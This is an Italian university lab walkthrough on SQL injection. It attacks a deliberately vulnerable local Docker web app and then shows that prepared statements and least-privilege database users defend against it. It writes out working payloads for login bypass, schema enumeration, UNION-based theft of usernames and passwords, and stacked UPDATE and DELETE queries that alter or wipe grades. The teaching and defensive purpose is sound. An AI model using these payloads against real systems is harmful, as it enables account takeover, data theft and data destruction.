# Walkthrough Progetto SQL Injection

Tutti i servizi sono stati configurati e avviati correttamente tramite Docker.

## Servizi Avviati
*   **Database (MariaDB 10.5)**: Port `3306`
*   **Web App Vulnerabile (Tema Rosso)**: [http://localhost:8080](http://localhost:8080)
*   **Web App Sicura (Tema Blu)**: [http://localhost:8081](http://localhost:8081)

---

## Come Eseguire i Test e Dimostrare i Principi CIA (Black Box)

Puoi trovare le istruzioni dettagliate e i payload pronti all'uso nel file [payloads.md](file:///c:/Users/lorem/Desktop/UNI/Sicurezza/Progetto_SQLInjection/exploits/payloads.md). Di seguito un riassunto dei test principali da mostrare, simulando un attaccante che **non conosce nulla del sistema**.

### 1. Bypass dell'Autenticazione (Tautologia Universale)
1. Vai su [http://localhost:8080/login.php](http://localhost:8080/login.php).
2. Nel campo **Username** inserisci:
   ```text
   ' OR 1=1 -- 
   ```
3. Inserisci qualsiasi cosa nel campo **Password** e premi **ACCEDI**.
4. Senza sapere alcun nome utente, la query estrarrà tutti gli utenti e ti loggherà come il primo della lista (spesso l'amministratore, in questo caso `admin_supremo`). (Violazione **Confidenzialità**).

### 2. Information Gathering (Fase di Studio)
1. Una volta dentro, l'attaccante usa la barra di ricerca per capire come è fatto il database.
2. Trova il numero di colonne della pagina:
   `' ORDER BY 3 -- ` (Funziona)
   `' ORDER BY 4 -- ` (Errore -> Le colonne sono 3).
3. Scopre i nomi delle tabelle:
   ```text
   ' UNION SELECT table_name, 'dummy', 'dummy' FROM information_schema.tables WHERE table_schema = database() -- 
   ```
   *(Risultato visibile in basso: `users`, `grades`)*
4. Scopre le colonne della tabella `users`:
   ```text
   ' UNION SELECT column_name, 'dummy', 'dummy' FROM information_schema.columns WHERE table_name = 'users' -- 
   ```

### 3. Esfiltrazione Dati (Union-Based)
1. Ora l'attaccante ha studiato il DB e lancia l'attacco mirato. Nella barra di ricerca, inserisce:
   ```text
   ' UNION SELECT username, password, email FROM users -- 
   ```
2. L'applicazione stamperà a video i dati personali e sensibili di tutti gli utenti, professori e admin compresi. (Violazione **Confidenzialità**).

### 4. Modifica Dati di Massa (Piggybacked Queries)
1. L'attaccante vuole manipolare il sistema. Sempre nella barra di ricerca, inserisce un update globale:
   ```text
   '; UPDATE grades SET grade = 10; -- 
   ```
2. Ricarica la pagina base senza ricerca: noterai che *tutti* i voti sono stati portati a `10`! (Violazione dell'**Integrità**).

### 5. Cancellazione Dati di Massa (Piggybacked Queries / DoS)
1. L'attaccante decide di distruggere i dati. Inserisce:
   ```text
   '; DELETE FROM grades; -- 
   ```
2. Ricarica la pagina: tutti i voti del sistema sono spariti per sempre (Violazione della **Disponibilità**).

---

## Dimostrazione dell'Efficacia delle Difese

### Difesa Web App (Prepared Statements)
Se ripeti gli stessi attacchi su [http://localhost:8081](http://localhost:8081) (App Sicura):
*   Il login fallirà perché gli apici (e l'istruzione `OR 1=1`) vengono gestiti come semplice testo e non elaborati come logica.
*   La barra di ricerca cercherà letteralmente quella stringa strana e non eseguirà né le `UNION` né gli `UPDATE` o `DELETE`.

### Difesa Database (Principio dei Minimi Privilegi)
L'app sicura gira su un DB separato e connessa con l'utente `lab_user_secure`.
Anche se l'attaccante scoprisse un modo per aggirare il codice PHP ed eseguire un comando di distruzione come `DROP TABLE grades` o `DELETE FROM grades`, quest'ultimo verrebbe **bloccato dal motore del database stesso**, poiché a quell'utente sono stati intenzionalmente revocati i permessi distruttivi.
